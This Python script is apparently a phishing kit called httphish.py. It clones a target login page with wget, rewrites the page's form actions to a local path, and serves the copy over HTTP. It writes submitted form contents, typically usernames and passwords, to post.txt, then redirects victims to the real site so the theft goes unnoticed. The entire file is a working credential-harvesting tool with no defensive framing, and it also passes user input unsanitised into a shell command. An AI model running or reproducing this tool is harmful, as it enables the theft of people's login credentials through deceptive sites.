# Import statements
import os
import http.server
import socketserver
import re

# TODO : ADD SSL SUPPORT

####################
###   CONSTANTS  ###
####################

BANNER = '''
  _     _   _         _     _     _                   
 | |__ | |_| |_ _ __ | |__ (_)___| |__    _ __  _   _ 
 | '_ \\| __| __| '_ \\| '_ \\| / __| '_ \\  | '_ \\| | | |
 | | | | |_| |_| |_) | | | | \\__ \\ | | |_| |_) | |_| |
 |_| |_|\\__|\\__| .__/|_| |_|_|___/_| |_(_) .__/ \\__, |
               |_|                       |_|    |___/                                             
'''
CURRENT_PATH = os.getcwd()
WEB_PATH = os.path.join(CURRENT_PATH, 'web')
INDEX_PATH = os.path.join(WEB_PATH, 'index.html')
POST_PATH = os.path.join(CURRENT_PATH, 'post.txt')
DEFAULT_USER_AGENT = "\"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/60.0\""
PORT = 80

############################
###   INPUT & WEB CRAWL  ###
############################

os.system("clear")
print(BANNER)

redirect_ip = input("[*] What is the IP you want to redirect to : ")

yes = {'yes','y', 'ye'}
no = {'no', 'n'}

use_wget = input("[*] Do you want to automatically download the page with wget? (Y/n) : ")

if use_wget.lower() not in no:
    url = input("[*] What is the FULL URL you want to copy : ")

    user_agent_change = input("[*] Change default user agent? (y/N) : ")
    
    if user_agent_change.lower() in yes:
        user_agent = input("User agent : ")
    else:
        user_agent = DEFAULT_USER_AGENT

    print("\n[*] Downloading web page with wget ...")

    # Use wget command to download
    os.system("wget -E -H -k -K -p -nH --cut-dirs=100 -nv {} --user-agent {} --directory-prefix={}".format(url, user_agent, WEB_PATH))

    print("[*] Done.\n")

else:
    print("[*] Make sure all the proper files are in /web before launching the HTTP server !")

# Make sure index.html exists

if not os.path.isfile(INDEX_PATH):
    html_files_in_web = []
    for file in os.listdir(WEB_PATH):
        if file.endswith(".html") or file.endswith(".htm"):
            html_files_in_web.append(os.path.join(WEB_PATH, file))
    
    if len(html_files_in_web) == 1:
        os.rename(os.path.join(WEB_PATH, html_files_in_web[0]), INDEX_PATH)
    else:
        index_filename = input("[*] Which file in /web should be used as index.html? (filename only) :")
        print("\n [*] Renaming file ...")
        os.rename(os.path.join(WEB_PATH, index_filename), INDEX_PATH)
        print("[*] Done.\n")


#########################
###  EDIT HTML FORMS  ###
#########################

print("[*] Editing HTML index file ...")
html_as_str = open(INDEX_PATH, 'r').read()

# Yes, I do in fact parse HTML with Regex, I know.

forms_pattern = '(<form[^>]*?action=")([^"]*)("[^>]*>)'                                         # Regex pattern
html_as_str = re.sub(forms_pattern, r'\1\\custom_path_for_form_post_requests\3', html_as_str)   # Make sure that all <form> POST action is directed to a special path

with open(INDEX_PATH, 'wb') as file:
    file.write(str.encode(html_as_str))


print("[*] Done.")

input("[*] Press ENTER to start the HTTP server ...")

######################
###   HTTP Server  ###
######################

# Custom SimpleHTTPRequestHandler where we edit the GET and POST actions and log messages
class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print("[*] GET request received!")                                      # Print that we received a request

        if os.path.exists(self.translate_path(self.path)):                      # Check if we have the requested file
            f = self.send_head()                                                # Send headers
            if f:
                self.copyfile(f, self.wfile)                                    # Write file to wfile stream
                f.close()
        else:                                                                   # If we don't have the requested file
            print("[*] Error : File {} is non-existant!".format(self.path))
            print("[*] Returning HTTP 303 response code ...")   
            remote_path = "http://{}{}".format(redirect_ip, self.path)          # http:// + ip + path
            self.send_response(303)                                             # Send HTTP 303 
            self.send_header("Location", remote_path)                           # Set Location in header to the remote path, if the file doesn't exist there, that server will return a 404
            self.end_headers() 

    def do_POST(self):
        print("[*] POST request received!")                                             # Print that we received a request

        content_length = int(self.headers['Content-Length'])                            # Get length of POST body
        body = self.rfile.read(content_length)                                          # Read entire POST body
        
        if self.path == "/custom_path_for_form_post_requests":                          # Check if the POST request path is "/custom_path_for_form_post_requests" (where we directed our form actions)
            print("[*] Form was filled! Writing output to post.txt ...")
            self.send_response(303)                                                     # Send HTTP 303 ("see other") which will make the browser perform a GET on the "Location" header
            self.send_header("Location", url)                                           # Set "Location" header to our initial URL
            with open(POST_PATH, 'a+') as file:                                         # Open post.txt in append mode to add the entire POST request
                file.write(body.decode("utf-8"))
                file.write("\n\n")
        else:
            self.send_response(307)                                                     # Send HTTP 307 redirect response, which will make the browser resend the exact same POST request
            self.send_header("Location", "http://{}{}".format(redirect_ip,self.path))   # Set the Location value in the HTTP response header to our redirect IP with the path to send the POST request
        
        self.end_headers()                                                              # End the HTTP header

    def log_message(self, format, *args):
        return

# Change directory to /web and launch the HTTP server there
os.chdir(WEB_PATH)
print("\n[*] Launching HTTP server ...")
httpd = socketserver.TCPServer(("", PORT), SimpleHTTPRequestHandler)
print("[*] Serving at port {}.".format(PORT))
print("[*] Use CTRL+C to exit and close the HTTP server.")

# Launch and run HTTP server as long CTRL+C isn't pressed
try:
    httpd.serve_forever()
except KeyboardInterrupt as error:
    print("\n[*] KeyboardInterrupt ...")
    httpd.server_close()
    print("\n[*] Server on port {} was shut down successfully.\n".format(PORT))
    print("[*] Please run cleanup.py before running this script again!\n")
    print(error)
